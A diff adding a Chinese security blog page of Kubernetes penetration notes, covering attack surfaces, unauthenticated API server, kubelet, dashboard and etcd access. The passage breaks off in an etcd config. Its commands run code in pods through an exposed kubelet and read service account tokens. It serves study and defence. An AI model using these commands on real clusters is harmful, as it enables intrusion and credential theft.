@@ -1,0 +1,439 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.2.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/blog-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/blog-16x16.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.lug.ustc.edu.cn/css?family=Noto+Serif+SC:300,300italic,400,400italic,700,700italic%7CRoboto+Mono:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/css/all.min.css" integrity="sha256-AbA177XfpSnFEvgpYu1jMygiLabzPCJCRIBtR5jGc0k=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"l0n9w4y.cc","root":"/","images":"/images","scheme":"Mist","darkmode":true,"version":"8.13.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":"default"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="本文探究K8S集群攻击思路、方式...">
+<meta property="og:type" content="article">
+<meta property="og:title" content="K8S集群渗透姿势小记">
+<meta property="og:url" content="https://l0n9w4y.cc/posts/33009/index.html">
+<meta property="og:site_name" content="L0n9w4y">
+<meta property="og:description" content="本文探究K8S集群攻击思路、方式...">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog-1254410573.cos.ap-beijing.myqcloud.com/Image/k8s_matix.png">
+<meta property="og:image" content="https://blog-1254410573.cos.ap-beijing.myqcloud.com/Image/k8s_pentest.png">
+<meta property="og:image" content="https://blog-1254410573.cos.ap-beijing.myqcloud.com/Image/k8s_chain.png">
+<meta property="article:published_time" content="2023-12-24T13:50:33.000Z">
+<meta property="article:modified_time" content="2024-09-07T14:22:58.648Z">
+<meta property="article:author" content="L0n9w4y">
+<meta property="article:tag" content="CloudSec">
+<meta property="article:tag" content="K8S">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog-1254410573.cos.ap-beijing.myqcloud.com/Image/k8s_matix.png">
+
+
+<link rel="canonical" href="https://l0n9w4y.cc/posts/33009/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://l0n9w4y.cc/posts/33009/","path":"posts/33009/","title":"K8S集群渗透姿势小记"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>K8S集群渗透姿势小记 | L0n9w4y</title>
+  
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">L0n9w4y</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-攻防"><a href="/A&D/" rel="section"><i class="fa fa-shield-halved fa-fw"></i>攻防</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-%E6%94%BB%E9%98%B2%E7%9F%A9%E9%98%B5"><span class="nav-text">0x00 攻防矩阵</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E6%94%BB%E5%87%BB%E7%9F%A9%E9%98%B5"><span class="nav-text">1. 攻击矩阵</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E6%94%BB%E5%87%BB%E9%93%BE%E8%B7%AF"><span class="nav-text">2. 攻击链路</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-K8s-%E6%94%BB%E5%87%BB%E9%9D%A2"><span class="nav-text">0x01 K8s 攻击面</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1%E3%80%81K8s-API-Server"><span class="nav-text">1、K8s API Server</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2%E3%80%81Kubectl%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="nav-text">2、Kubectl未授权访问</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3%E3%80%81dashboard%E6%9C%AA%E6%8E%88%E6%9D%83"><span class="nav-text">3、dashboard未授权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4%E3%80%81etcd%E6%9C%AA%E6%8E%88%E6%9D%83"><span class="nav-text">4、etcd未授权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5%E3%80%81kubectl-proxy"><span class="nav-text">5、kubectl proxy</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8"><span class="nav-text">0x02 容器逃逸</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#privileged-%E5%AE%B9%E5%99%A8%E5%86%85-mount-device"><span class="nav-text">privileged 容器内 mount device</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8C%81%E4%B9%85%E5%8C%96"><span class="nav-text">0x03 利用与持久化</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E9%83%A8%E7%BD%B2%E6%81%B6%E6%84%8FPod"><span class="nav-text">1. 部署恶意Pod</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E5%88%A9%E7%94%A8Service-Account"><span class="nav-text">2. 利用Service Account</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-shadow-api-server"><span class="nav-text">3. shadow api server</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-cronjob%E6%8C%81%E4%B9%85%E5%8C%96"><span class="nav-text">4. cronjob持久化</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0xFF-%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-text">0xFF 参考链接</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="L0n9w4y"
+      src="/images/hexo.png">
+  <p class="site-author-name" itemprop="name">L0n9w4y</p>
+  <div class="site-description" itemprop="description">問道遠兮，求索未止...</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">45</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">45</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/L0n9w4y" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;L0n9w4y" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://weibo.com/l0n9w4y" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;l0n9w4y" rel="noopener" target="_blank"><i class="fab fa-weibo fa-fw"></i>Weibo</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/_L0n9_" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;_L0n9_" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+  </div>
+
+
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="返回顶部">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://l0n9w4y.cc/posts/33009/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/hexo.png">
+      <meta itemprop="name" content="L0n9w4y">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="L0n9w4y">
+      <meta itemprop="description" content="問道遠兮，求索未止...">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="K8S集群渗透姿势小记 | L0n9w4y">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          K8S集群渗透姿势小记
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-12-24 21:50:33" itemprop="dateCreated datePublished" datetime="2023-12-24T21:50:33+08:00">2023-12-24</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E4%BA%91%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">云安全</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <center>本文探究K8S集群攻击思路、方式...</center>
+
+<span id="more"></span>
+
+<p>本文涉及内容，仅限于网络安全从业者学习交流，切勿用于非法用途…</p>
+<h2 id="0x00-攻防矩阵"><a href="#0x00-攻防矩阵" class="headerlink" title="0x00 攻防矩阵"></a>0x00 攻防矩阵</h2><h3 id="1-攻击矩阵"><a href="#1-攻击矩阵" class="headerlink" title="1. 攻击矩阵"></a>1. 攻击矩阵</h3><p><img src="https://blog-1254410573.cos.ap-beijing.myqcloud.com/Image/k8s_matix.png"></p>
+<p><img src="https://blog-1254410573.cos.ap-beijing.myqcloud.com/Image/k8s_pentest.png"></p>
+<h3 id="2-攻击链路"><a href="#2-攻击链路" class="headerlink" title="2. 攻击链路"></a>2. 攻击链路</h3><p><img src="https://blog-1254410573.cos.ap-beijing.myqcloud.com/Image/k8s_chain.png"></p>
+<h2 id="0x01-K8s-攻击面"><a href="#0x01-K8s-攻击面" class="headerlink" title="0x01 K8s 攻击面"></a>0x01 K8s 攻击面</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">kube-apiserver: 6443, 8080</span><br><span class="line"></span><br><span class="line">kubectl proxy: 8080, 8001</span><br><span class="line"></span><br><span class="line">kubelet: 10250, 10255, 4149</span><br><span class="line"></span><br><span class="line">dashboard: 30000</span><br><span class="line"></span><br><span class="line">docker api: 2375</span><br><span class="line"></span><br><span class="line">etcd: 2379, 2380</span><br><span class="line"></span><br><span class="line">kube-controller-manager: 10252</span><br><span class="line"></span><br><span class="line">kube-proxy: 10256, 31442</span><br><span class="line"></span><br><span class="line">kube-scheduler: 10251</span><br><span class="line"></span><br><span class="line">weave: 6781, 6782, 6783</span><br><span class="line"></span><br><span class="line">kubeflow-dashboard: 8080</span><br></pre></td></tr></table></figure>
+
+<h3 id="1、K8s-API-Server"><a href="#1、K8s-API-Server" class="headerlink" title="1、K8s API Server"></a>1、K8s API Server</h3><p>默认情况，Kubernetes API Server提供HTTP的两个端口：8080，6443。insecure-port： 默认端口8080，在HTTP中没有认证和授权检查。secure-port ：默认端口6443， 认证方式，令牌文件或者客户端证书.</p>
+<p><strong>未鉴权配置</strong></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kube-apiserver --insecure-bind-address=0.0.0.0 --insecure-port=8080</span><br><span class="line"></span><br><span class="line">or</span><br><span class="line"></span><br><span class="line">- --insecure-port=8080</span><br><span class="line">- --insecure-bind-address=0.0.0.0</span><br><span class="line">systemctl restart kubelet</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Path: /etc/kubernetes/manifests/kube-apiserver.yaml</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">kube-apiserver</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">kube-system</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">kube-apiserver</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">k8s.gcr.io/kube-apiserver:version</span></span><br><span class="line">    <span class="attr">command:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">kube-apiserver</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--etcd-servers=https://etcd-server-1:2379,https://etcd-server-2:2379,https://etcd-server-3:2379</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--insecure-port=0</span>   <span class="comment"># 0表示关闭</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--secure-port=6443</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--advertise-address=&lt;api-server-ip&gt;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--allow-privileged=true</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--service-cluster-ip-range=10.96.0.0/12</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--service-node-port-range=30000-32767</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--tls-cert-file=/etc/kubernetes/pki/apiserver.crt</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--tls-private-key-file=/etc/kubernetes/pki/apiserver.key</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--client-ca-file=/etc/kubernetes/pki/ca.crt</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--service-account-key-file=/etc/kubernetes/pki/sa.pub</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--kubelet-client-certificate=/etc/kubernetes/pki/apiserver-kubelet-client.crt</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--kubelet-client-key=/etc/kubernetes/pki/apiserver-kubelet-client.key</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--enable-bootstrap-token-auth=true</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--requestheader-client-ca-file=/etc/kubernetes/pki/front-proxy-ca.crt</span></span><br><span class="line">    <span class="comment"># Other options...</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">volumes:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">hostPath:</span></span><br><span class="line">      <span class="attr">path:</span> <span class="string">/etc/kubernetes/pki</span></span><br><span class="line">      <span class="attr">type:</span> <span class="string">DirectoryOrCreate</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">k8s-certs</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>未授权探测</strong></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -is https://ip:6443 -k</span><br><span class="line"></span><br><span class="line">curl -is https://ip:8080</span><br></pre></td></tr></table></figure>
+
+<p><strong>未鉴权利用</strong></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kubectl -s ip:8080 get node</span><br><span class="line"></span><br><span class="line">kubectl -s ip:8080 --namespace=default <span class="built_in">exec</span> -it pod-name bash</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="2、Kubectl未授权访问"><a href="#2、Kubectl未授权访问" class="headerlink" title="2、Kubectl未授权访问"></a>2、Kubectl未授权访问</h3><p>每一个 Node 节点都有一个 kubelet 服务，kubelet 监听了 10250，10248，10255 等端口。</p>
+<ul>
+<li>匿名访问配置：在 Kubernetes 中，kubelet 的配置文件通常位于 <code>/var/lib/kubelet/config.yaml</code></li>
+</ul>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">kubelet.config.k8s.io/v1beta1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">KubeletConfiguration</span></span><br><span class="line"><span class="attr">authentication:</span></span><br><span class="line">  <span class="attr">anonymous:</span></span><br><span class="line">    <span class="attr">enabled:</span> <span class="literal">true</span>  <span class="comment"># 开启匿名访问</span></span><br><span class="line"><span class="attr">authentication:</span></span><br><span class="line">	<span class="attr">mode:</span> <span class="string">AlwaysAllow</span> <span class="comment"># 允许所有请求，不需要API请求鉴权</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>执行命令</li>
+</ul>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl -XPOST -k <span class="string">&quot;https://IP:10250/run/&lt;namespace&gt;/&lt;pod&gt;/&lt;container&gt;&quot;</span> -d <span class="string">&quot;cmd=&lt;command&gt;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 参数获取</span></span><br><span class="line"></span><br><span class="line">curl -is https://ip:10250/runningpods/</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>获取凭证</li>
+</ul>
+<p>一个 pod 与一个服务账户相关联，该服务账户的凭证（token）被放入该pod中每个容器的文件系统树，在 <code>/var/run/secrets/kubernetes.io/serviceaccount/token</code></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -XPOST -k https://ip:10250/run/&lt;namespace&gt;/&lt;pod&gt;/&lt;container&gt; -d <span class="string">&quot;cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="3、dashboard未授权"><a href="#3、dashboard未授权" class="headerlink" title="3、dashboard未授权"></a>3、dashboard未授权</h3><ul>
+<li><p>在 dashboard 中默认是存在鉴权机制的，用户可以通过 kubeconfig 或者 Token 两种方式登录，当用户开启了 enable-skip-login 时可以在登录界面点击 Skip 跳过登录进入 dashboard</p>
+</li>
+<li><p>通过点击 Skip 进入 dashboard 默认是没有操作集群的权限的，因为 Kubernetes 使用 RBAC(Role-based access control) 机制进行身份认证和权限管理，不同的 serviceaccount 拥有不同的集群权限。</p>
+</li>
+</ul>
+<p>当为 Kubernetes-dashboard 绑定 cluster-admin 这个 ClusterRole（cluster-admin 拥有管理集群的最高权限）时，可进行利用</p>
+<ol>
+<li>创建dashboard-admin.yaml 文件</li>
+</ol>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ClusterRoleBinding</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">admin-user</span></span><br><span class="line"><span class="attr">roleRef:</span></span><br><span class="line">  <span class="attr">apiGroup:</span> <span class="string">rbac.authorization.k8s.io</span></span><br><span class="line">  <span class="attr">kind:</span> <span class="string">ClusterRole</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">cluster-admin</span></span><br><span class="line"><span class="attr">subjects:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">kind:</span> <span class="string">ServiceAccount</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">admin-user</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">kubernetes-dashboard</span></span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>执行 <code>kubectl create -f dashboard-admin.yaml</code></li>
+</ol>
+<h3 id="4、etcd未授权"><a href="#4、etcd未授权" class="headerlink" title="4、etcd未授权"></a>4、etcd未授权</h3><p>在启动etcd时，如果没有指定 –client-cert-auth 参数打开证书校验，并且把listen-client-urls监听修改为0.0.0.0会将默认端口2379暴露在外，造成数据泄露或集群被控</p>
+<p>安装k8s之后默认的配置2379都只会监听127.0.0.1，etcd的配置文件在&#x2F;etc&#x2F;kubernetes&#x2F;manifests&#x2F;etcd.yaml，在未使用client-cert-auth参数打开证书校验时，任意地址访问Etcd服务都不需要进行证书校验</p>
+<ul>
+<li>关闭证书校验</li>
+</ul>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">etcd-&lt;hostname&gt;</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">kube-system</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">hostNetwork:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">etcd</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">k8s.gcr.io/etcd:version</span></span><br><span class="line">    <span class="attr">command:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">etcd</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--data-dir=/var/lib/etcd</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--name=etcd-&lt;hostname&gt;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--listen-client-urls=https://127.0.0.1:2379,https://&lt;Pod-IP&gt;:2379</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--advertise-client-urls=https://&lt;Pod-IP&gt;:2379</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--listen-peer-urls=https://&lt;Pod-IP&gt;:2380</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--initial-advertise-peer-urls=https://&lt;Pod-IP&gt;:2380</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--initial-cluster-token=etcd-cluster-&lt;some-token&gt;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--initial-cluster=etcd-&lt;hostname&gt;=https://&lt;Pod-IP&gt;:2380</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--initial-cluster-state=new</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--client-cert-auth</span>  <span class="comment"># 证书校验</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--trusted-ca-file=/etc/kubernetes/pki/etcd/ca.crt</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--cert-file=/etc/kubernetes/pki/etcd/server.crt</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--key-file=/etc/kubernetes/pki/etcd/server.key</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">--peer-client-cert-auth</span></span><br><span class="line">    <span class="bullet">-</span> <span 